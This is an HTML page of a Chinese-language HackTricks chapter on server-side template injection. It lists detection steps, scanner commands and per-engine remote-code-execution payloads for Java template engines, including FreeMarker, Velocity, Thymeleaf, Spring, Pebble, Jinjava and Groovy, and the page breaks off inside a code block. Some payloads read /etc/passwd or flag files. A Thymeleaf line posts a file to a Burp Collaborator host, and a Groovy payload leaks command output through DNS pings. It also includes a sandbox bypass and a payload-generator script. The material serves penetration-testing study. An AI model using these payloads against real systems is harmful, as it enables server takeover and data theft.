<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>SSTI (Server Side Template Injection)</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ssti-server-side-template-injection"><a class="header" href="#ssti-server-side-template-injection">SSTI (Server Side Template Injection)</a></h1>
<p>{% hint style="success" %}
<a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*3RO051EgizbEer-mdHD8Kg.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*3RO051EgizbEer-mdHD8Kg.jpe</a>学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>
<p><a href="https://www.rootedcon.com"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="什么是-ssti-server-side-template-injection"><a class="header" href="#什么是-ssti-server-side-template-injection">什么是 SSTI (Server-Side Template Injection)</a></h2>
<p>服务器端模板注入是一种漏洞，当攻击者能够将恶意代码注入到在服务器上执行的模板中时，就会发生这种漏洞。此漏洞可以在多种技术中找到，包括 Jinja。</p>
<p>Jinja 是一种在 web 应用程序中使用的流行模板引擎。让我们考虑一个使用 Jinja 的脆弱代码片段示例：</p>
<pre><code class="language-python">output = template.render(name=request.args.get('name'))
</code></pre>
<p>在这段脆弱的代码中，用户请求中的 <code>name</code> 参数直接通过 <code>render</code> 函数传递到模板中。这可能允许攻击者将恶意代码注入到 <code>name</code> 参数中，从而导致服务器端模板注入。</p>
<p>例如，攻击者可以构造一个包含如下有效负载的请求：</p>
<pre><code>http://vulnerable-website.com/?name={{bad-stuff-here}}
</code></pre>
<p>The payload <code>{{bad-stuff-here}}</code> 被注入到 <code>name</code> 参数中。这个有效载荷可以包含 Jinja 模板指令，使攻击者能够执行未经授权的代码或操纵模板引擎，从而可能控制服务器。</p>
<p>为了防止服务器端模板注入漏洞，开发人员应确保在将用户输入插入模板之前，正确地对其进行清理和验证。实施输入验证和使用上下文感知的转义技术可以帮助减轻此漏洞的风险。</p>
<h3 id="检测"><a class="header" href="#检测">检测</a></h3>
<p>要检测服务器端模板注入 (SSTI)，最初，<strong>模糊测试模板</strong> 是一种简单的方法。这涉及将一系列特殊字符 (<strong><code>${{&lt;%[%'"}}%\</code></strong>) 注入模板，并分析服务器对常规数据与此特殊有效载荷的响应差异。漏洞指示包括：</p>
<ul>
<li>抛出的错误，揭示漏洞并可能暴露模板引擎。</li>
<li>反射中缺少有效载荷，或部分缺失，暗示服务器以不同于常规数据的方式处理它。</li>
<li><strong>明文上下文</strong>：通过检查服务器是否评估模板表达式（例如 <code>{{7*7}}</code>，<code>${7*7}</code>）来区分 XSS。</li>
<li><strong>代码上下文</strong>：通过更改输入参数确认漏洞。例如，改变 <code>http://vulnerable-website.com/?greeting=data.username</code> 中的 <code>greeting</code>，查看服务器的输出是动态的还是固定的，比如 <code>greeting=data.username}}hello</code> 返回用户名。</li>
</ul>
<h4 id="识别阶段"><a class="header" href="#识别阶段">识别阶段</a></h4>
<p>识别模板引擎涉及分析错误消息或手动测试各种特定语言的有效载荷。常见的导致错误的有效载荷包括 <code>${7/0}</code>，<code>{{7/0}}</code> 和 <code>&lt;%= 7/0 %&gt;</code>。观察服务器对数学运算的响应有助于确定特定的模板引擎。</p>
<h4 id="通过有效载荷识别"><a class="header" href="#通过有效载荷识别">通过有效载荷识别</a></h4>
<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*35XwCGeYeKYmeaU8rdkSdg.jpeg">https://miro.medium.com/v2/resize:fit:1100/format:webp/1*35XwCGeYeKYmeaU8rdkSdg.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息请见 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<h3 id="tinja"><a class="header" href="#tinja"><a href="https://github.com/Hackmanit/TInjA">TInjA</a></a></h3>
<p>一个高效的 SSTI + CSTI 扫描器，利用新颖的多语言组合</p>
<pre><code class="language-bash">tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
</code></pre>
<h3 id="sstimap"><a class="header" href="#sstimap"><a href="https://github.com/vladko312/sstimap">SSTImap</a></a></h3>
<pre><code class="language-bash">python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/" --crawl 5 --forms
python3 sstimap.py -u "https://example.com/page?name=John" -s
</code></pre>
<h3 id="tplmap"><a class="header" href="#tplmap"><a href="https://github.com/epinna/tplmap">Tplmap</a></a></h3>
<pre><code class="language-python">python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link" --level 5 -e jade
</code></pre>
<h3 id="模板注入表"><a class="header" href="#模板注入表"><a href="https://github.com/Hackmanit/template-injection-table">模板注入表</a></a></h3>
<p>一个包含最有效的模板注入多语言的交互式表格，以及44个最重要的模板引擎的预期响应。</p>
<h2 id="漏洞"><a class="header" href="#漏洞">漏洞</a></h2>
<h3 id="通用"><a class="header" href="#通用">通用</a></h3>
<p>在这个<strong>词汇表</strong>中，您可以找到一些下面提到的引擎环境中<strong>定义的变量</strong>：</p>
<ul>
<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt</a></li>
<li><a href="https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt">https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt</a></li>
</ul>
<h3 id="java"><a class="header" href="#java">Java</a></h3>
<p><strong>Java - 基本注入</strong></p>
<pre><code class="language-java">${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
</code></pre>
<p><strong>Java - 获取系统的环境变量</strong></p>
<pre><code class="language-java">${T(java.lang.System).getenv()}
</code></pre>
<p><strong>Java - 检索 /etc/passwd</strong></p>
<pre><code class="language-java">${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
</code></pre>
<h3 id="freemarker-java"><a class="header" href="#freemarker-java">FreeMarker (Java)</a></h3>
<p>您可以在 <a href="https://try.freemarker.apache.org">https://try.freemarker.apache.org</a> 尝试您的有效载荷</p>
<ul>
<li><code>{{7*7}} = {{7*7}}</code></li>
<li><code>${7*7} = 49</code></li>
<li><code>#{7*7} = 49 -- (legacy)</code></li>
<li><code>${7*'7'} Nothing</code></li>
<li><code>${foobar}</code></li>
</ul>
<pre><code class="language-java">&lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
</code></pre>
<p><strong>Freemarker - 沙箱绕过</strong></p>
<p>⚠️ 仅适用于 2.3.30 版本以下的 Freemarker</p>
<pre><code class="language-java">&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;
&lt;#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")&gt;
&lt;#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)&gt;
&lt;#assign ec=classloader.loadClass("freemarker.template.utility.Execute")&gt;
${dwf.newInstance(ec,null)("id")}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li>在 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a> 的 FreeMarker 部分</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker</a></li>
</ul>
<h3 id="velocity-java"><a class="header" href="#velocity-java">Velocity (Java)</a></h3>
<pre><code class="language-java">// I think this doesn't work
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

// This should work?
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat%20/flag563378e453.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li>在 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a> 的 Velocity 部分</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity</a></li>
</ul>
<h3 id="thymeleaf"><a class="header" href="#thymeleaf">Thymeleaf</a></h3>
<p>在 Thymeleaf 中，测试 SSTI 漏洞的一个常见表达式是 <code>${7*7}</code>，这同样适用于这个模板引擎。对于潜在的远程代码执行，可以使用以下表达式：</p>
<ul>
<li>SpringEL:</li>
</ul>
<pre><code class="language-java">${T(java.lang.Runtime).getRuntime().exec('calc')}
</code></pre>
<ul>
<li>OGNL:</li>
</ul>
<pre><code class="language-java">${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
</code></pre>
<p>Thymeleaf 要求这些表达式放置在特定属性中。然而，<em>表达式内联</em> 对于其他模板位置是支持的，使用的语法如 <code>[[...]]</code> 或 <code>[(...)]</code>。因此，一个简单的 SSTI 测试有效载荷可能看起来像 <code>[[${7*7}]]</code>。</p>
<p>然而，这个有效载荷成功的可能性通常较低。Thymeleaf 的默认配置不支持动态模板生成；模板必须是预定义的。开发者需要实现自己的 <code>TemplateResolver</code> 来动态创建字符串模板，这并不常见。</p>
<p>Thymeleaf 还提供了 <em>表达式预处理</em>，其中双下划线 (<code>__...__</code>) 内的表达式会被预处理。这个特性可以在构建表达式时利用，如 Thymeleaf 文档中所示：</p>
<pre><code class="language-java">#{selection.__${sel.code}__}
</code></pre>
<p><strong>Thymeleaf中的漏洞示例</strong></p>
<p>考虑以下代码片段，它可能容易受到利用：</p>
<pre><code class="language-xml">&lt;a th:href="@{__${path}__}" th:title="${title}"&gt;
&lt;a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'&gt;
</code></pre>
<p>这表明，如果模板引擎不正确地处理这些输入，可能会导致远程代码执行，访问类似以下的 URL：</p>
<pre><code>http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a></li>
</ul>
<p>{% content-ref url="el-expression-language.md" %}
<a href="el-expression-language.html">el-expression-language.md</a>
{% endcontent-ref %}</p>
<h3 id="spring-框架-java"><a class="header" href="#spring-框架-java">Spring 框架 (Java)</a></h3>
<pre><code class="language-java">*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
</code></pre>
<p><strong>绕过过滤器</strong></p>
<p>可以使用多个变量表达式，如果 <code>${...}</code> 无法工作，请尝试 <code>#{...}</code>、<code>*{...}</code>、<code>@{...}</code> 或 <code>~{...}</code>。</p>
<ul>
<li>读取 <code>/etc/passwd</code></li>
</ul>
<pre><code class="language-java">${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
</code></pre>
<ul>
<li>自定义脚本用于有效载荷生成</li>
</ul>
<pre><code class="language-python">#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://javamana.com/2021/11/20211121071046977B.html">Thymleaf SSTI</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd">Payloads all the things</a></li>
</ul>
<h3 id="spring-视图操控-java"><a class="header" href="#spring-视图操控-java">Spring 视图操控 (Java)</a></h3>
<pre><code class="language-java">__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
</code></pre>
<ul>
<li><a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></li>
</ul>
<p>{% content-ref url="el-expression-language.md" %}
<a href="el-expression-language.html">el-expression-language.md</a>
{% endcontent-ref %}</p>
<h3 id="pebble-java"><a class="header" href="#pebble-java">Pebble (Java)</a></h3>
<ul>
<li><code>{{ someString.toUPPERCASE() }}</code></li>
</ul>
<p>Pebble 的旧版本（&lt; 3.0.9）：</p>
<pre><code class="language-java">{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
</code></pre>
<p>新版本的 Pebble :</p>
<pre><code class="language-java">{% raw %}
{% set cmd = 'id' %}
{% endraw %}






{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
</code></pre>
<h3 id="jinjava-java"><a class="header" href="#jinjava-java">Jinjava (Java)</a></h3>
<pre><code class="language-java">{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
</code></pre>
<p>Jinjava 是一个由 Hubspot 开发的开源项目，地址为 <a href="https://github.com/HubSpot/jinjava/">https://github.com/HubSpot/jinjava/</a></p>
<p><strong>Jinjava - 命令执行</strong></p>
<p>通过 <a href="https://github.com/HubSpot/jinjava/pull/230">https://github.com/HubSpot/jinjava/pull/230</a> 修复</p>
<pre><code class="language-java">{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava</a></li>
</ul>
<h3 id="hubspot---hubl-java"><a class="header" href="#hubspot---hubl-java">Hubspot - HuBL (Java)</a></h3>
<ul>
<li><code>{% %}</code> 语句分隔符</li>
<li><code>{{ }}</code> 表达式分隔符</li>
<li><code>{# #}</code> 注释分隔符</li>
<li><code>{{ request }}</code> - com.hubspot.content.hubl.context.TemplateContextRequest@23548206</li>
<li><code>{{'a'.toUpperCase()}}</code> - "A"</li>
<li><code>{{'a'.concat('b')}}</code> - "ab"</li>
<li><code>{{'a'.getClass()}}</code> - java.lang.String</li>
<li><code>{{request.getClass()}}</code> - class com.hubspot.content.hubl.context.TemplateContextRequest</li>
<li><code>{{request.getClass().getDeclaredMethods()[0]}}</code> - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()</li>
</ul>
<p>搜索 "com.hubspot.content.hubl.context.TemplateContextRequest" 并发现了 <a href="https://github.com/HubSpot/jinjava/">Jinjava 项目在 Github</a>。</p>
<pre><code class="language-java">{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html">https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html</a></li>
</ul>
<h3 id="表达式语言---el-java"><a class="header" href="#表达式语言---el-java">表达式语言 - EL (Java)</a></h3>
<ul>
<li><code>${"aaaa"}</code> - "aaaa"</li>
<li><code>${99999+1}</code> - 100000.</li>
<li><code>#{7*7}</code> - 49</li>
<li><code>${{7*7}}</code> - 49</li>
<li><code>${{request}}, ${{session}}, {{faceContext}}</code></li>
</ul>
<p>表达式语言 (EL) 是一个基本特性，促进了 JavaEE 中表现层（如网页）与应用逻辑（如托管 bean）之间的交互。它在多个 JavaEE 技术中被广泛使用，以简化这种通信。利用 EL 的关键 JavaEE 技术包括：</p>
<ul>
<li><strong>JavaServer Faces (JSF)</strong>：使用 EL 将 JSF 页面中的组件绑定到相应的后端数据和操作。</li>
<li><strong>JavaServer Pages (JSP)</strong>：EL 在 JSP 中用于访问和操作 JSP 页面中的数据，使得连接页面元素与应用数据变得更加容易。</li>
<li><strong>Java EE 的上下文和依赖注入 (CDI)</strong>：EL 与 CDI 集成，允许 web 层与托管 bean 之间无缝交互，确保更连贯的应用结构。</li>
</ul>
<p>查看以下页面以了解更多关于 <strong>EL 解释器的利用</strong>：</p>
<p>{% content-ref url="el-expression-language.md" %}
<a href="el-expression-language.html">el-expression-language.md</a>
{% endcontent-ref %}</p>
<h3 id="groovy-java"><a class="header" href="#groovy-java">Groovy (Java)</a></h3>
<p>以下安全管理器绕过来自于这个 <a href="https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/"><strong>写作</strong></a>。</p>
<pre><code class="language-java">//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
